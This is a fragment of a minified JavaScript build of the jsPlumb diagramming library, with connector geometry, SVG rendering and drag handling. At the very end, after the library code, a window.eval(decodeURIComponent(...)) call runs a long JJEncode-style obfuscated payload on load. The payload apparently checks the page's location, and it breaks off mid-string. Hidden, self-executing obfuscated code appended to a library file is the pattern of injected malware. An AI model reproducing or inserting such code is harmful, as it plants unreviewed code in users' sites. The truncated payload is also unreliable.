e=n,o={x:[[e.startStubX,e.endStubX],null,[e.endStubX,e.startStubX]],y:[[e.startStubY,e.endStubY],null,[e.endStubY,e.startStubY]]},i={x:[[v,e.startStubY],[v,e.endStubY]],y:[[e.startStubX,C],[e.endStubX,C]]},r={x:[[e.endStubX,e.startStubY]],y:[[e.startStubX,e.endStubY]]},d={x:[[e.startStubX,e.endStubY],[e.endStubX,e.endStubY]],y:[[e.endStubX,e.startStubY],[e.endStubX,e.endStubY]]},_={x:[[e.startStubX,C],[e.endStubX,C],[e.endStubX,e.endStubY]],y:[[v,e.startStubY],[v,e.endStubY],[e.endStubX,e.endStubY]]},s={x:[e.startStubY,e.endStubY],y:[e.startStubX,e.endStubX]},a=b[t][0],w=b[t][1],l=e.so[a]+1,u=e.to[w]+1,c=-1===e.to[w]&&s[t][1]<s[t][0]||1===e.to[w]&&s[t][1]>s[t][0],B=o[t][l][0],h=o[t][l][1],j={x:[[[1,2,3,4],null,[2,1,4,3]],null,[[4,3,2,1],null,[3,4,1,2]]],y:[[[3,2,1,4],null,[2,3,4,1]],null,[[4,1,2,3],null,[1,4,3,2]]]}[t][l][u];return e.segment===j[3]||e.segment===j[2]&&c?i[t]:e.segment===j[2]&&h<B?r[t]:e.segment===j[2]&&h>=B||e.segment===j[1]&&!c?_[t]:e.segment===j[0]||e.segment===j[1]&&c?d[t]:void 0},orthogonal:function(t,e,o,i,r){var d=n,_={x:-1===d.so[0]?Math.min(e,i):Math.max(e,i),y:-1===d.so[1]?Math.min(e,i):Math.max(e,i)}[t];return{x:[[_,o],[_,r],[i,r]],y:[[o,_],[r,_],[r,i]]}[t]},opposite:function(e,o,r,d){var _=n,s={x:"y",y:"x"}[e],a={x:"height",y:"width"}[e],w=_["is"+e.toUpperCase()+"GreaterThanStubTimes2"];if(t.sourceEndpoint.elementId===t.targetEndpoint.elementId){var l=r+(1-t.sourceEndpoint.anchor[s])*t.sourceInfo[a]+i.maxStub;return{x:[[o,l],[d,l]],y:[[l,o],[l,d]]}[e]}return!w||1===_.so[B]&&o>d||-1===_.so[B]&&o<d?{x:[[o,C],[d,C]],y:[[v,o],[v,d]]}[e]:1===_.so[B]&&o<d||-1===_.so[B]&&o>d?{x:[[v,_.sy],[v,_.ty]],y:[[_.sx,C],[_.tx,C]]}[e]:void 0}}[n.anchorOrientation](n.sourceAxis,p,f,g,m);if(y)for(var D=0;D<y.length;D++)u(o,y[D][0],y[D][1],n);u(o,c[2],c[3],n),u(o,n.tx,n.ty,n),i.setGeometry({segments:o,sourcePos:a,targetPos:w},!0)}h(this,o,n)}},t.extend(n.Connectors.Flowchart,n.Connectors.AbstractConnector)}.call("undefined"!=typeof window?window:this),function(){var n=this.jsPlumb,t=this.jsPlumbUtil;n.Connectors.AbstractBezierConnector=function(t){var e,o=!1!==(t=t||{}).showLoopback,i=(t.curviness,t.margin||5),r=(t.proximityLimit,t.orientation&&"clockwise"===t.orientation),d=t.loopbackRadius||25,_=!1;return this.overrideSetEditable=function(){return!_},this._compute=function(n,t){var s=t.sourcePos,a=t.targetPos,w=Math.abs(s[0]-a[0]),l=Math.abs(s[1]-a[1]);if(o&&t.sourceEndpoint.elementId===t.targetEndpoint.elementId){_=!0;var u=t.sourcePos[0],c=t.sourcePos[1]-i,B=u,h=c-d,j=B-d,p=h-d;w=2*d,l=2*d,n.points[0]=j,n.points[1]=p,n.points[2]=w,n.points[3]=l,e.addSegment(this,"Arc",{loopback:!0,x1:u-j+4,y1:c-p,startAngle:0,endAngle:2*Math.PI,r:d,ac:!r,x2:u-j-4,y2:c-p,cx:B-j,cy:h-p})}else _=!1,this._computeBezier(n,t,s,a,w,l)},e=n.Connectors.AbstractConnector.apply(this,arguments)},t.extend(n.Connectors.AbstractBezierConnector,n.Connectors.AbstractConnector);var e=function(t){t=t||{},this.type="Bezier";var e=n.Connectors.AbstractBezierConnector.apply(this,arguments),o=t.curviness||150,i=10;this.getCurviness=function(){return o},this._findControlPoint=function(n,t,e,r,d,_,s){var a=[];return _[0]!==s[0]||_[1]===s[1]?(0===s[0]?a.push(e[0]<t[0]?n[0]+i:n[0]-i):a.push(n[0]+o*s[0]),0===s[1]?a.push(e[1]<t[1]?n[1]+i:n[1]-i):a.push(n[1]+o*_[1])):(0===_[0]?a.push(t[0]<e[0]?n[0]+i:n[0]-i):a.push(n[0]-o*_[0]),0===_[1]?a.push(t[1]<e[1]?n[1]+i:n[1]-i):a.push(n[1]+o*s[1])),a},this._computeBezier=function(n,t,o,i,r,d){var _,s,a=this.getGeometry(),w=o[0]<i[0]?r:0,l=o[1]<i[1]?d:0,u=o[0]<i[0]?0:r,c=o[1]<i[1]?0:d;(this.hasBeenEdited()||this.isEditing())&&null!=a&&null!=a.controlPoints&&null!=a.controlPoints[0]&&null!=a.controlPoints[1]?(_=a.controlPoints[0],s=a.controlPoints[1]):(_=this._findControlPoint([w,l],o,i,t.sourceEndpoint,t.targetEndpoint,n.so,n.to),s=this._findControlPoint([u,c],i,o,t.targetEndpoint,t.sourceEndpoint,n.to,n.so)),e.setGeometry({controlPoints:[_,s],sourcePos:o,targetPos:i},!0),e.addSegment(this,"Bezier",{x1:w,y1:l,x2:u,y2:c,cp1x:_[0],cp1y:_[1],cp2x:s[0],cp2y:s[1]})}};n.Connectors.Bezier=e,t.extend(e,n.Connectors.AbstractBezierConnector)}.call("undefined"!=typeof window?window:this),function(){var n=this.jsPlumb,t=this.jsPlumbUtil,e=function(t){t=t||{},this.type="StateMachine";var e,o=n.Connectors.AbstractBezierConnector.apply(this,arguments),i=t.curviness||10,r=t.margin||5,d=t.proximityLimit||80;t.orientation&&t.orientation,this._computeBezier=function(n,t,_,s,a,w){var l=t.sourcePos[0]<t.targetPos[0]?0:a,u=t.sourcePos[1]<t.targetPos[1]?0:w,c=t.sourcePos[0]<t.targetPos[0]?a:0,B=t.sourcePos[1]<t.targetPos[1]?w:0;0===t.sourcePos[2]&&(l-=r),1===t.sourcePos[2]&&(l+=r),0===t.sourcePos[3]&&(u-=r),1===t.sourcePos[3]&&(u+=r),0===t.targetPos[2]&&(c-=r),1===t.targetPos[2]&&(c+=r),0===t.targetPos[3]&&(B-=r),1===t.targetPos[3]&&(B+=r);var h,j,p,f,g=(l+c)/2,m=(u+B)/2,v=function(n,t,e,o){return n<=e&&o<=t?1:n<=e&&t<=o?2:e<=n&&o>=t?3:4}(l,u,c,B),C=Math.sqrt(Math.pow(c-l,2)+Math.pow(B-u,2)),b=o.getGeometry();(this.hasBeenEdited()||this.isEditing())&&null!=b?(h=b.controlPoints[0][0],p=b.controlPoints[0][1],j=b.controlPoints[1][0],f=b.controlPoints[1][1]):(h=(e=function(n,t,e,o,i,r,d,_,s){return _<=s?[n,t]:1===e?o[3]<=0&&i[3]>=1?[n+(o[2]<.5?-1*r:r),t]:o[2]>=1&&i[2]<=0?[n,t+(o[3]<.5?-1*d:d)]:[n+-1*r,t+-1*d]:2===e?o[3]>=1&&i[3]<=0?[n+(o[2]<.5?-1*r:r),t]:o[2]>=1&&i[2]<=0?[n,t+(o[3]<.5?-1*d:d)]:[n+r,t+-1*d]:3===e?o[3]>=1&&i[3]<=0?[n+(o[2]<.5?-1*r:r),t]:o[2]<=0&&i[2]>=1?[n,t+(o[3]<.5?-1*d:d)]:[n+-1*r,t+-1*d]:4===e?o[3]<=0&&i[3]>=1?[n+(o[2]<.5?-1*r:r),t]:o[2]<=0&&i[2]>=1?[n,t+(o[3]<.5?-1*d:d)]:[n+r,t+-1*d]:void 0}(g,m,v,t.sourcePos,t.targetPos,i,i,C,d))[0],j=e[0],p=e[1],f=e[1],o.setGeometry({controlPoints:[e,e],sourcePos:_,targetPos:s,quadrant:v,curviness:i},!0)),o.addSegment(this,"Bezier",{x1:c,y1:B,x2:l,y2:u,cp1x:h,cp1y:p,cp2x:j,cp2y:f})}};n.Connectors.StateMachine=e,t.extend(e,n.Connectors.AbstractBezierConnector)}.call("undefined"!=typeof window?window:this),function(){var n=this.jsPlumb,t=this.jsPlumbUtil,e="Straight",o=function(t){this.type=e;var o=n.Connectors.AbstractConnector.apply(this,arguments);this._compute=function(n,t){o.addSegment(this,e,{x1:n.sx,y1:n.sy,x2:n.startStubX,y2:n.startStubY}),o.addSegment(this,e,{x1:n.startStubX,y1:n.startStubY,x2:n.endStubX,y2:n.endStubY}),o.addSegment(this,e,{x1:n.endStubX,y1:n.endStubY,x2:n.tx,y2:n.ty})}};n.Connectors.Straight=o,t.extend(o,n.Connectors.AbstractConnector)}.call("undefined"!=typeof window?window:this),function(){var n=this.jsPlumb,t=this.jsPlumbUtil,e={"stroke-linejoin":"stroke-linejoin","stroke-dashoffset":"stroke-dashoffset","stroke-linecap":"stroke-linecap"},o="stroke-dasharray",i="dashstyle",r="fill",d="stroke",_="none",s="http://www.w3.org/2000/svg",a=function(n,t){for(var e in t)n.setAttribute(e,""+t[e])},w=function(t,e){return(e=e||{}).version="1.1",e.xmlns=s,n.createElementNS(s,t,null,null,e)},l=function(n){return"position:absolute;left:"+n[0]+"px;top:"+n[1]+"px"},u=function(n){for(var t=n.querySelectorAll(" defs,linearGradient,radialGradient"),e=0;e<t.length;e++)t[e].parentNode.removeChild(t[e])},c=function(n,t,s,a,l){if(t.setAttribute(r,s.fill?s.fill:_),t.setAttribute(d,s.stroke?s.stroke:_),s.gradient?function(n,t,e,o,i){var _,s="jsplumb_gradient_"+i._jsPlumb.instance.idstamp();u(n),_=e.gradient.offset?w("radialGradient",{id:s}):w("linearGradient",{id:s,gradientUnits:"userSpaceOnUse"});var a=w("defs");n.appendChild(a),a.appendChild(_);for(var l=0;l<e.gradient.stops.length;l++){var c=1===i.segment||2===i.segment?l:e.gradient.stops.length-1-l,B=e.gradient.stops[c][1],h=w("stop",{offset:Math.floor(100*e.gradient.stops[l][0])+"%","stop-color":B});_.appendChild(h)}var j=e.stroke?d:r;t.setAttribute(j,"url(#"+s+")")}(n,t,s,0,l):(u(n),t.setAttribute("style","")),s.strokeWidth&&t.setAttribute("stroke-width",s.strokeWidth),s[i]&&s.strokeWidth&&!s[o]){var c=-1===s[i].indexOf(",")?" ":",",B="";s[i].split(c).forEach(function(n){B+=Math.floor(n*s.strokeWidth)+c}),t.setAttribute(o,B)}else s[o]&&t.setAttribute(o,s[o]);for(var h in e)s[h]&&t.setAttribute(e[h],s[h])},B=function(n,t,e){n.childNodes.length>e?n.insertBefore(t,n.childNodes[e]):n.appendChild(t)};t.svg={node:w,attr:a,pos:l};var h=function(e){var o=e.pointerEventsSpec||"all",i={};n.jsPlumbUIComponent.apply(this,e.originalArgs),this.canvas=null,this.path=null,this.svg=null,this.bgCanvas=null;var r=e.cssClass+" "+(e.originalArgs[0].cssClass||""),d={style:"",width:0,height:0,"pointer-events":o,position:"absolute"};this.svg=w("svg",d),e.useDivWrapper?(this.canvas=n.createElement("div",{position:"absolute"}),t.sizeElement(this.canvas,0,0,1,1),this.canvas.className=r):(a(this.svg,{class:r}),this.canvas=this.svg),e._jsPlumb.appendElement(this.canvas,e.originalArgs[0].parent),e.useDivWrapper&&this.canvas.appendChild(this.svg);var _=[this.canvas];return this.getDisplayElements=function(){return _},this.appendDisplayElement=function(n){_.push(n)},this.paint=function(n,o,r){if(null!=n){var d,_=[this.x,this.y],s=[this.w,this.h];null!=r&&(r.xmin<0&&(_[0]+=r.xmin),r.ymin<0&&(_[1]+=r.ymin),s[0]=r.xmax+(r.xmin<0?-r.xmin:0),s[1]=r.ymax+(r.ymin<0?-r.ymin:0)),e.useDivWrapper?(t.sizeElement(this.canvas,_[0],_[1],s[0],s[1]),_[0]=0,_[1]=0,d=l([0,0])):d=l([_[0],_[1]]),i.paint.apply(this,arguments),a(this.svg,{style:d,width:s[0]||0,height:s[1]||0})}},{renderer:i}};t.extend(h,n.jsPlumbUIComponent,{cleanup:function(n){n||null==this.typeId?(this.canvas&&(this.canvas._jsPlumb=null),this.svg&&(this.svg._jsPlumb=null),this.bgCanvas&&(this.bgCanvas._jsPlumb=null),this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.bgCanvas&&this.bgCanvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.svg=null,this.canvas=null,this.path=null,this.group=null):(this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.bgCanvas&&this.bgCanvas.parentNode&&this.bgCanvas.parentNode.removeChild(this.bgCanvas))},reattach:function(n){var t=n.getContainer();this.canvas&&null==this.canvas.parentNode&&t.appendChild(this.canvas),this.bgCanvas&&null==this.bgCanvas.parentNode&&t.appendChild(this.bgCanvas)},setVisible:function(n){this.canvas&&(this.canvas.style.display=n?"block":"none")}}),n.ConnectorRenderers.svg=function(t){var e=this,o=h.apply(this,[{cssClass:t._jsPlumb.connectorClass+(this.isEditable()?" "+t._jsPlumb.editableConnectorClass:""),originalArgs:arguments,pointerEventsSpec:"none",_jsPlumb:t._jsPlumb}]),i=this.setEditable;this.setEditable=function(t){var e=i.apply(this,[t]);n[e?"addClass":"removeClass"](this.canvas,this._jsPlumb.instance.editableConnectorClass)},o.renderer.paint=function(o,i,r){var d=e.getSegments(),_=[0,0];if(r.xmin<0&&(_[0]=-r.xmin),r.ymin<0&&(_[1]=-r.ymin),d.length>0){var s={d:e.getPathData(),transform:"translate("+_[0]+","+_[1]+")","pointer-events":t["pointer-events"]||"visibleStroke"},l=null;e.x,e.y,e.w,e.h;if(o.outlineStroke){var u=o.outlineWidth||1,h=o.strokeWidth+2*u;delete(l=n.extend({},o)).gradient,l.stroke=o.outlineStroke,l.strokeWidth=h,null==e.bgPath?(e.bgPath=w("path",s),n.addClass(e.bgPath,n.connectorOutlineClass),B(e.svg,e.bgPath,0)):a(e.bgPath,s),c(e.svg,e.bgPath,l,0,e)}null==e.path?(e.path=w("path",s),B(e.svg,e.path,o.outlineStroke?1:0)):a(e.path,s),c(e.svg,e.path,o,0,e)}}},t.extend(n.ConnectorRenderers.svg,h);var j=n.SvgEndpoint=function(t){h.apply(this,[{cssClass:t._jsPlumb.endpointClass,originalArgs:arguments,pointerEventsSpec:"all",useDivWrapper:!0,_jsPlumb:t._jsPlumb}]).renderer.paint=function(t){var e=n.extend({},t);e.outlineStroke&&(e.stroke=e.outlineStroke),null==this.node?(this.node=this.makeNode(e),this.svg.appendChild(this.node)):null!=this.updateNode&&this.updateNode(this.node),c(this.svg,this.node,e,(this.x,this.y,this.w,this.h),this),l(this.node,(this.x,this.y))}.bind(this)};t.extend(j,h),n.Endpoints.svg.Dot=function(){n.Endpoints.Dot.apply(this,arguments),j.apply(this,arguments),this.makeNode=function(n){return w("circle",{cx:this.w/2,cy:this.h/2,r:this.radius})},this.updateNode=function(n){a(n,{cx:this.w/2,cy:this.h/2,r:this.radius})}},t.extend(n.Endpoints.svg.Dot,[n.Endpoints.Dot,j]),n.Endpoints.svg.Rectangle=function(){n.Endpoints.Rectangle.apply(this,arguments),j.apply(this,arguments),this.makeNode=function(n){return w("rect",{width:this.w,height:this.h})},this.updateNode=function(n){a(n,{width:this.w,height:this.h})}},t.extend(n.Endpoints.svg.Rectangle,[n.Endpoints.Rectangle,j]),n.Connectors.svg.Flowchart=function(){n.Connectors.Flowchart.apply(this,arguments),n.ConnectorRenderers.svg.apply(this,arguments)},t.extend(n.Connectors.svg.Flowchart,[n.Connectors.Flowchart,n.ConnectorRenderers.svg]),n.Connectors.svg.Bezier=function(){n.Connectors.Bezier.apply(this,arguments),n.ConnectorRenderers.svg.apply(this,arguments)},t.extend(n.Connectors.svg.Bezier,[n.Connectors.Bezier,n.ConnectorRenderers.svg]),n.Connectors.svg.Straight=function(){n.Connectors.Straight.apply(this,arguments),n.ConnectorRenderers.svg.apply(this,arguments)},t.extend(n.Connectors.svg.Straight,[n.Connectors.Straight,n.ConnectorRenderers.svg]),n.Connectors.svg.StateMachine=function(){n.Connectors.StateMachine.apply(this,arguments),n.ConnectorRenderers.svg.apply(this,arguments)},t.extend(n.Connectors.svg.StateMachine,[n.Connectors.StateMachine,n.ConnectorRenderers.svg]),n.Endpoints.svg.Image=n.Endpoints.Image,n.Endpoints.svg.Blank=n.Endpoints.Blank,n.Overlays.svg.Label=n.Overlays.Label,n.Overlays.svg.Custom=n.Overlays.Custom;var p=function(t,e){t.apply(this,e),n.jsPlumbUIComponent.apply(this,e),this.isAppendedAtTopLevel=!1,this.path=null,this.paint=function(n,t){if(n.component.svg&&t){null==this.path&&(this.path=w("path",{"pointer-events":"all"}),n.component.svg.appendChild(this.path),this.elementCreated&&this.elementCreated(this.path,n.component),this.canvas=n.component.svg);var i=e&&1===e.length&&e[0].cssClass||"",r=[0,0];t.xmin<0&&(r[0]=-t.xmin),t.ymin<0&&(r[1]=-t.ymin),a(this.path,{d:o(n.d),class:i,stroke:n.stroke?n.stroke:null,fill:n.fill?n.fill:null,transform:"translate("+r[0]+","+r[1]+")"})}};var o=function(n){return isNaN(n.cxy.x)||isNaN(n.cxy.y)?"":"M"+n.hxy.x+","+n.hxy.y+" L"+n.tail[0].x+","+n.tail[0].y+" L"+n.cxy.x+","+n.cxy.y+" L"+n.tail[1].x+","+n.tail[1].y+" L"+n.hxy.x+","+n.hxy.y};this.transfer=function(n){n.canvas&&this.path&&this.path.parentNode&&(this.path.parentNode.removeChild(this.path),n.canvas.appendChild(this.path))}};t.extend(p,[n.jsPlumbUIComponent,n.Overlays.AbstractOverlay],{cleanup:function(n){null!=this.path&&(n?this._jsPlumb.instance.removeElement(this.path):this.path.parentNode&&this.path.parentNode.removeChild(this.path))},reattach:function(n,t){this.path&&t.canvas&&t.canvas.appendChild(this.path)},setVisible:function(n){null!=this.path&&(this.path.style.display=n?"block":"none")}}),n.Overlays.svg.Arrow=function(){p.apply(this,[n.Overlays.Arrow,arguments])},t.extend(n.Overlays.svg.Arrow,[n.Overlays.Arrow,p]),n.Overlays.svg.PlainArrow=function(){p.apply(this,[n.Overlays.PlainArrow,arguments])},t.extend(n.Overlays.svg.PlainArrow,[n.Overlays.PlainArrow,p]),n.Overlays.svg.Diamond=function(){p.apply(this,[n.Overlays.Diamond,arguments])},t.extend(n.Overlays.svg.Diamond,[n.Overlays.Diamond,p]),n.Overlays.svg.GuideLines=function(){var t,e,o=null,i=this;n.Overlays.GuideLines.apply(this,arguments),this.paint=function(n,d){null==o&&(o=w("path"),n.connector.svg.appendChild(o),i.attachListeners(o,n.connector),i.attachListeners(o,i),t=w("path"),n.connector.svg.appendChild(t),i.attachListeners(t,n.connector),i.attachListeners(t,i),e=w("path"),n.connector.svg.appendChild(e),i.attachListeners(e,n.connector),i.attachListeners(e,i));var _=[0,0];d.xmin<0&&(_[0]=-d.xmin),d.ymin<0&&(_[1]=-d.ymin),a(o,{d:r(n.head,n.tail),stroke:"red",fill:null,transform:"translate("+_[0]+","+_[1]+")"}),a(t,{d:r(n.tailLine[0],n.tailLine[1]),stroke:"blue",fill:null,transform:"translate("+_[0]+","+_[1]+")"}),a(e,{d:r(n.headLine[0],n.headLine[1]),stroke:"green",fill:null,transform:"translate("+_[0]+","+_[1]+")"})};var r=function(n,t){return"M "+n.x+","+n.y+" L"+t.x+","+t.y}},t.extend(n.Overlays.svg.GuideLines,n.Overlays.GuideLines)}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumb,e=n.jsPlumbUtil,o=n.Katavorio,i=n.Biltong,r=function(n,e){var r="_katavorio_"+(e=e||"main"),d=n[r],_=n.getEventManager();return d||((d=new o({bind:_.on,unbind:_.off,getSize:t.getSize,getConstrainingRectangle:function(n){return[n.parentNode.scrollWidth,n.parentNode.scrollHeight]},getPosition:function(t,e){var o=n.getOffset(t,e,t._katavorioDrag?t.offsetParent:null);return[o.left,o.top]},setPosition:function(n,t){n.style.left=t[0]+"px",n.style.top=t[1]+"px"},addClass:t.addClass,removeClass:t.removeClass,intersects:i.intersects,indexOf:function(n,t){return n.indexOf(t)},scope:n.getDefaultScope(),css:{noSelect:n.dragSelectClass,droppable:"jtk-droppable",draggable:"jtk-draggable",drag:"jtk-drag",selected:"jtk-drag-selected",active:"jtk-drag-active",hover:"jtk-drag-hover",ghostProxy:"jtk-ghost-proxy"}})).setZoom(n.getZoom()),n[r]=d,n.bind("zoom",d.setZoom)),d},d=function(n,t){var o=function(o){if(null!=t[o]){if(e.isString(t[o])){var i=t[o].match(/-=/)?-1:1,r=t[o].substring(2);return n[o]+i*r}return t[o]}return n[o]};return[o("left"),o("top")]};t.extend(n.jsPlumbInstance.prototype,{animationSupported:!0,getElement:function(n){return null==n?null:"string"==typeof(n="string"==typeof n?n:null!=n.length&&null==n.enctype?n[0]:n)?document.getElementById(n):n},removeElement:function(n){r(this).elementRemoved(n),this.getEventManager().remove(n)},doAnimate:function(n,e,o){o=o||{};var i=this.getOffset(n),r=d(i,e),_=r[0]-i.left,s=r[1]-i.top,a=o.duration||250,w=a/15,l=15/a*_,u=15/a*s,c=0,B=setInterval(function(){t.setPosition(n,{left:i.left+l*(c+1),top:i.top+u*(c+1)}),null!=o.step&&o.step(c,Math.ceil(w)),++c>=w&&(window.clearInterval(B),null!=o.complete&&o.complete())},15)},destroyDraggable:function(n,t){r(this,t).destroyDraggable(n)},destroyDroppable:function(n,t){r(this,t).destroyDroppable(n)},initDraggable:function(n,t,e){r(this,e).draggable(n,t)},initDroppable:function(n,t,e){r(this,e).droppable(n,t)},isAlreadyDraggable:function(n){return null!=n._katavorioDrag},isDragSupported:function(n,t){return!0},isDropSupported:function(n,t){return!0},isElementDraggable:function(n){return(n=t.getElement(n))._katavorioDrag&&n._katavorioDrag.isEnabled()},getDragObject:function(n){return n[0].drag.getDragElement()},getDragScope:function(n){return n._katavorioDrag&&n._katavorioDrag.scopes.join(" ")||""},getDropEvent:function(n){return n[0].e},getUIPosition:function(n,t){var e=n[0].el;if(null==e.offsetParent)return null;var o=n[0].finalPos||n[0].pos,i={left:o[0],top:o[1]};if(e._katavorioDrag&&e.offsetParent!==this.getContainer()){var r=this.getOffset(e.offsetParent);i.left+=r.left,i.top+=r.top}return i},setDragFilter:function(n,t,e){n._katavorioDrag&&n._katavorioDrag.setFilter(t,e)},setElementDraggable:function(n,e){(n=t.getElement(n))._katavorioDrag&&n._katavorioDrag.setEnabled(e)},setDragScope:function(n,t){n._katavorioDrag&&n._katavorioDrag.k.setDragScope(n,t)},setDropScope:function(n,t){n._katavorioDrop&&n._katavorioDrop.length>0&&n._katavorioDrop[0].k.setDropScope(n,t)},addToPosse:function(n,e){var o=Array.prototype.slice.call(arguments,1),i=r(this);t.each(n,function(n){(n=[t.getElement(n)]).push.apply(n,o),i.addToPosse.apply(i,n)})},setPosse:function(n,e){var o=Array.prototype.slice.call(arguments,1),i=r(this);t.each(n,function(n){(n=[t.getElement(n)]).push.apply(n,o),i.setPosse.apply(i,n)})},removeFromPosse:function(n,e){var o=Array.prototype.slice.call(arguments,1),i=r(this);t.each(n,function(n){(n=[t.getElement(n)]).push.apply(n,o),i.removeFromPosse.apply(i,n)})},removeFromAllPosses:function(n){var e=r(this);t.each(n,function(n){e.removeFromAllPosses(t.getElement(n))})},setPosseState:function(n,e,o){var i=r(this);t.each(n,function(n){i.setPosseState(t.getElement(n),e,o)})},dragEvents:{start:"start",stop:"stop",drag:"drag",step:"step",over:"over",out:"out",drop:"drop",complete:"complete",beforeStart:"beforeStart"},animEvents:{step:"step",complete:"complete"},stopDrag:function(n){n._katavorioDrag&&n._katavorioDrag.abort()},addToDragSelection:function(n){r(this).select(n)},removeFromDragSelection:function(n){r(this).deselect(n)},clearDragSelection:function(){r(this).deselectAll()},trigger:function(n,t,e,o){this.getEventManager().trigger(n,t,e,o)},doReset:function(){for(var n in this)0===n.indexOf("_katavorio_")&&this[n].reset()}}),function(n){!function t(){/complete|loaded|interactive/.test(document.readyState)&&void 0!==document.body&&null!=document.body?n():setTimeout(t,9)}()}(t.init)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%